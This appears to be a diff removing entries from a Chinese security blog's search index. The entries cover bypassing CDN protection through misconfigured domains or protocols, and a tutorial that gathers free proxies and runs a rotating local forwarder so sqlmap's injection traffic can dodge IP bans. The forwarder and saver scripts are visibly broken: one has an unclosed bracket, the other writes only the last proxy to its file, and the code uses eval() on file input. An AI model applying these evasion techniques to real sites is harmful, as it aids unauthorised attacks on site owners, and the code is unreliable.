-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan</span><br></pre></td></tr></table></figure>
-<h2 id="八、配置不当导致绕过">八、配置不当导致绕过</h2>
-<p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p>
-<ul>
-<li>案例1：为了方便用户访问，<a href="http://xn--www-ot9d021dl8ca199e.test.com">我们常常将www.test.com</a> 和 <a href="http://test.com">test.com</a> 解析到同一个站点，<a href="http://xn--CDNwww-5e8i318auw2h9jblx9h.test.com">而CDN只配置了www.test.com</a>，<a href="http://xn--test-pr9lp7quqa868a.com">通过访问test.com</a>，就可以绕过 CDN 了。</li>
-<li>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>技巧</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SqlMap代理池</title>
-    <url>/2020/06/22/%E4%BB%A3%E7%90%86%E6%B1%A0/</url>
-    <content><![CDATA[<h2 id="获取代理池">获取代理池</h2>
-<p>获取代理池使用了GIthub上的项目：<a href="https://github.com/jhao104/proxy_pool">https://github.com/jhao104/proxy_pool</a> ，并利用REDIS存储获取到的代理地址</p>
-<h3 id="启动项目">启动项目</h3>
-<p>在<code>cli</code>目录下通过<code>ProxyPool.py</code>启动</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 首先启动调度程序</span><br><span class="line">&gt;&gt;&gt;python proxyPool.py schedule</span><br><span class="line"></span><br><span class="line"># 然后启动webApi服务</span><br><span class="line">&gt;&gt;&gt;python proxyPool.py webserver</span><br></pre></td></tr></table></figure>
-<h3 id="Api">Api</h3>
-<p>启动过几分钟后就能看到抓取到的代理IP，可以直接到数据库中查看，也可以通过api访问http://127.0.0.1:5010 查看。</p>
-<table>
-<thead>
-<tr>
-<th>api</th>
-<th>method</th>
-<th>Description</th>
-<th>arg</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>/</td>
-<td>GET</td>
-<td>api介绍</td>
-<td>None</td>
-</tr>
-<tr>
-<td>/get</td>
-<td>GET</td>
-<td>随机获取一个代理</td>
-<td>None</td>
-</tr>
-<tr>
-<td>/get_all</td>
-<td>GET</td>
-<td>获取所有代理</td>
-<td>None</td>
-</tr>
-<tr>
-<td>/get_status</td>
-<td>GET</td>
-<td>查看代理数量</td>
-<td>None</td>
-</tr>
-<tr>
-<td>/delete</td>
-<td>GET</td>
-<td>删除代理</td>
-<td>proxy=host:ip</td>
-</tr>
-</tbody>
-</table>
-<h3 id="保存代理">保存代理</h3>
-<p>自己编写了个小脚本将<code>ProxyPool.py</code>获取到的代理保存在<code>ips.txt</code>中<br>
-<strong>get_proxy.py</strong>：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_proxy():</span><br><span class="line">    return requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_all&#x2F;&quot;).json()</span><br><span class="line"></span><br><span class="line">def delete_proxy(proxy):</span><br><span class="line">    requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;delete&#x2F;?proxy&#x3D;&#123;&#125;&quot;.format(proxy))</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_status&quot;).json()</span><br><span class="line">count &#x3D; res.get(&quot;useful_proxy&quot;)</span><br><span class="line">print(&quot;目前代理池中共计：%s个代理.&quot; % count)</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;ips.txt&quot;, &quot;w&quot;)</span><br><span class="line">for i in range(count):</span><br><span class="line">    b &#x3D; get_proxy()[i][&quot;proxy&quot;]</span><br><span class="line">f.write(b + &quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
-<h2 id="本地代理转发">本地代理转发</h2>
-<p>借用前人的成果，实现的效果是启用本地<code>127.0.0.1:9999</code>服务，将<code>ips.txt</code>内的代理转发给本地客户端<br>
-<strong><a href="http://ips.py">ips.py</a></strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> error</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">localtime = time.asctime(time.localtime(time.time()))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyServerTest</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, proxyip</span>):</span></span><br><span class="line">        <span class="comment"># 本地socket服务</span></span><br><span class="line">        self.ser = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.proxyip = proxyip</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 本地服务IP和端口</span></span><br><span class="line">            self.ser.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>))</span><br><span class="line">            <span class="comment"># 最大连接数</span></span><br><span class="line">            self.ser.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">&quot;[-]The local service : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[-]The local service : &quot;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 接收客户端数据</span></span><br><span class="line">                client, addr = self.ser.accept()</span><br><span class="line">                print(<span class="string">&#x27;[*]accept %s connect&#x27;</span> % (addr,))</span><br><span class="line">                data = client.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                print(<span class="string">&#x27;[*&#x27;</span> + localtime + <span class="string">&#x27;]: Accept data...&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">&quot;[-]Local receiving client : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[-]Local receiving client : &quot;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># 目标代理服务器，将客户端接收数据转发给代理服务器</span></span><br><span class="line">                mbsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                iplen = <span class="built_in">len</span>(self.proxyip)</span><br><span class="line">                proxyip = self.proxyip[random.randint(<span class="number">0</span>, iplen - <span class="number">1</span>)]</span><br><span class="line">                print(<span class="string">&quot;[!]Now proxy ip:&quot;</span> + <span class="built_in">str</span>(proxyip))</span><br><span class="line">                prip = proxyip[<span class="number">0</span>]</span><br><span class="line">                prpo = proxyip[<span class="number">1</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    mbsocket.settimeout(<span class="number">3</span>)</span><br><span class="line">                    mbsocket.connect((prip, prpo))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    print(<span class="string">&quot;[-]RE_Connect...&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#                   except :</span></span><br><span class="line">            <span class="comment">#                       print(&quot;[-]Connect failed,change proxy ip now...&quot;)</span></span><br><span class="line">            <span class="comment">#                      pass</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                mbsocket.send(data)</span><br><span class="line">            <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">&quot;[-]Sent to the proxy server : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[-]Sent to the proxy server : &quot;</span> + <span class="built_in">str</span>(e)</span><br><span class="line">                               </span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment"># 从代理服务器接收数据，然后转发回客户端</span></span><br><span class="line">                    data_1 = mbsocket.recv(<span class="number">1024</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> data_1:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    print(<span class="string">&#x27;[*&#x27;</span> + localtime + <span class="string">&#x27;]: Send data...&#x27;</span>)</span><br><span class="line">                    client.send(data_1)</span><br><span class="line">                <span class="keyword">except</span> socket.timeout <span class="keyword">as</span> e:</span><br><span class="line">                    print(proxyip)</span><br><span class="line">                    print(<span class="string">&quot;[-]Back to the client : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 关闭连接</span></span><br><span class="line"></span><br><span class="line">            client.close()</span><br><span class="line">            mbsocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Loadips</span>():</span></span><br><span class="line">    print(<span class="string">&quot;[*]Loading proxy ips..&quot;</span>)</span><br><span class="line">    ip_list = []</span><br><span class="line">    ip = [<span class="string">&#x27;ip&#x27;</span>, <span class="string">&#x27;port&#x27;</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ips.txt&quot;</span>) <span class="keyword">as</span> ips:</span><br><span class="line">        lines = ips.readlines()</span><br><span class="line">                               </span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        ip[<span class="number">0</span>], ip[<span class="number">1</span>] = line.strip().split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        ip[<span class="number">1</span>] = <span class="built_in">eval</span>(ip[<span class="number">1</span>])</span><br><span class="line">        nip = <span class="built_in">tuple</span>(ip)</span><br><span class="line">        ip_list.append(nip)</span><br><span class="line">    <span class="keyword">return</span> ip_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;&#x27;&#x27;*Atuhor : V@1n3R.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*Blog :http://www.Lz1y.cn</span></span><br><span class="line"><span class="string">*date: 2017.7.17</span></span><br><span class="line"><span class="string">*http://www.Lz1y.cn/wordpress/?p=643</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                         __     __    _       _____ ____    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                         \ \   / /_ _/ |_ __ |___ /|  _ \   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                          \ \ / / _` | | &#x27;_ \  |_ \| |_) |  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                           \ V / (_| | | | | |___) |  _ &lt; _ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            \_/ \__,_|_|_| |_|____/|_| \_(_) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ip_list = Loadips()</span><br><span class="line">    <span class="comment">#   ip_list = [(&#x27;118.89.148.92&#x27;,8088)]</span></span><br><span class="line">    <span class="comment">#   ip_list = tuple(ip_list)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pst = ProxyServerTest(ip_list)</span><br><span class="line">        <span class="comment"># 多线程</span></span><br><span class="line">        t = threading.Thread(target=pst.run, name=<span class="string">&#x27;LoopThread&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;[*]Waiting for connection...&#x27;</span>)</span><br><span class="line">        <span class="comment"># 关闭多线程</span></span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;[-]main : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[-]main : &quot;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<h2 id="SqlMap使用代理池">SqlMap使用代理池</h2>
-<blockquote>
-<p>sqlmap加上代理 “–proxy=http://127.0.0.1:9999” 即可使用</p>
-<p>使用之前建议先检测一下代理的有效性：<a href="http://h.jiguangdaili.com/check/">http://h.jiguangdaili.com/check/</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Sqlmap</tag>
       </tags>
   </entry>
 </search>
